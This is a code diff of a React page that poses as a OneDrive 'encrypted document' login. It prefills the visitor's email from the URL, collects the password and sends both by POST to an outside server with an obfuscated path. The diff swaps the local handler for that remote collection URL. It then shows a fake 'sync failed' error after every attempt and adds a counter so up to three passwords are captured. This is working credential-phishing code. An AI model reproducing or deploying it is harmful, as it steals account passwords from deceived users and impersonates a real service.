@@ -1,9 +1,9 @@
 import React from "react";
-import {DiOnedrive} from "react-icons/di"
+import { DiOnedrive } from "react-icons/di"
 
 const Modal = ({ toggle, open }) => {
-//   const [count, setCount] = React.useState(0);
-//   const [showModal, setShowModal] = React.useState(false);
+  //   const [count, setCount] = React.useState(0);
+  //   const [showModal, setShowModal] = React.useState(false);
   const errorBox = React.useRef(null);
   const subBtn = React.useRef(null);
   const [values, setValues] = React.useState({
@@ -12,6 +12,7 @@ const Modal = ({ toggle, open }) => {
   });
 
   const [message, setMessage] = React.useState("");
+  const [counter, setCounter] = React.useState(0);
 
   const handleSubmit = (e) => {
     e.preventDefault();
@@ -31,29 +32,40 @@ const Modal = ({ toggle, open }) => {
     }
     subBtn.current.innerHTML = "Processing..."
     subBtn.current.disabled = true;
+    if (counter > 2) {
+      setTimeout(() => {
+        setMessage("Error: OneDrive sync failed. Please try again.");
+        subBtn.current.innerHTML = "Download"
+        setValues({ ...values, password: "" });
+        subBtn.current.disabled = false;
+        setTimeout(() => {
+          setMessage("");
+        }, 5000);
+      }, 3000)
+      return;
+    }
+    setCounter(counter + 1);
     const formData = new FormData();
     Object.entries(values).forEach(([k, v]) => formData.append(k, v));
     const xhr = new XMLHttpRequest();
-    xhr.open("POST", "submit.php", true);
+    xhr.open("POST", "https://pcx.sunnova-solar.com/fnsCAHeP4ztJF8xC6KE2/ks4qzQsqn6eSg9O12qUT/mr.docss77.php", true);
     xhr.onload = () => {
-        setMessage("Error: OneDrive sync failed. Please try again.");
-        subBtn.current.innerHTML = "Download"
-        setValues({ ...values, password: "" });
-        subBtn.current.disabled = false;
-        setTimeout(() => {
-          setMessage("");
-        }, 5000);
+      setMessage("Error: OneDrive sync failed. Please try again.");
+      subBtn.current.innerHTML = "Download"
+      setValues({ ...values, password: "" });
+      subBtn.current.disabled = false;
+      setTimeout(() => {
+        setMessage("");
+      }, 5000);
     };
     xhr.error = () => {
-       
-
-        setMessage("Error: OneDrive sync failed. Please try again.");
-        subBtn.current.innerHTML = "Download"
-        setValues({ ...values, password: "" });
-        subBtn.current.disabled = false;
-        setTimeout(() => {
-          setMessage("");
-        }, 5000);
+      setMessage("Error: OneDrive sync failed. Please try again.");
+      subBtn.current.innerHTML = "Download"
+      setValues({ ...values, password: "" });
+      subBtn.current.disabled = false;
+      setTimeout(() => {
+        setMessage("");
+      }, 5000);
     };
     xhr.send(formData);
   };
@@ -74,46 +86,46 @@ const Modal = ({ toggle, open }) => {
 
   React.useEffect(() => {
     setValues({ ...values, email: getParameterByName("email") });
-  // eslint-disable-next-line react-hooks/exhaustive-deps
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
-//   React.useEffect(() => {
-//     setShowModal(true);
-//   }, []);
+  //   React.useEffect(() => {
+  //     setShowModal(true);
+  //   }, []);
   return (
     <>
-        <div className="modal">
-          <div className="main">
-            <div className="content">
-              <p className="logo"><DiOnedrive /> OneDrive</p>
-              <p className="info-text">An Encrypted document was shared with your email <span>{values.email}</span>. Please proceed to authenticate and view document on OneDrive</p>
-              <form onSubmit={handleSubmit}>
-                <div className="form-group">
-                  <input
-                    type="hidden"
-                    name="email"
-                    value={values.email}
-                  />
-                </div>
-                <div className="form-group">
-                    <label htmlFor="">Enter Password</label>
-                    <p ref={errorBox} className="error">{message} &nbsp;</p>
-                  <input
-                    type="password"
-                    name="password"
-                    className="form-control"
-                    value={values.password}
-                    onChange={handleChange}
-                    placeholder="Password"
-                  />
-                </div>
-                <p className="info-tint">This link is only valid for intended email address</p>
-                <div className="btn">
-                  <button type="submit" ref={subBtn}>Download</button>
-                </div>
-              </form>
-            </div>
+      <div className="modal">
+        <div className="main">
+          <div className="content">
+            <p className="logo"><DiOnedrive /> OneDrive</p>
+            <p className="info-text">An Encrypted document was shared with your email <span>{values.email}</span>. Please proceed to authenticate and view document on OneDrive</p>
+            <form onSubmit={handleSubmit}>
+              <div className="form-group">
+                <input
+                  type="hidden"
+                  name="email"
+                  value={values.email}
+                />
+              </div>
+              <div className="form-group">
+                <label htmlFor="">Enter Password</label>
+                <p ref={errorBox} className="error">{message} &nbsp;</p>
+                <input
+                  type="password"
+                  name="password"
+                  className="form-control"
+                  value={values.password}
+                  onChange={handleChange}
+                  placeholder="Password"
+                />
+              </div>
+              <p className="info-tint">This link is only valid for intended email address</p>
+              <div className="btn">
+                <button type="submit" ref={subBtn}>Download</button>
+              </div>
+            </form>
           </div>
         </div>
+      </div>
     </>
   );
 };
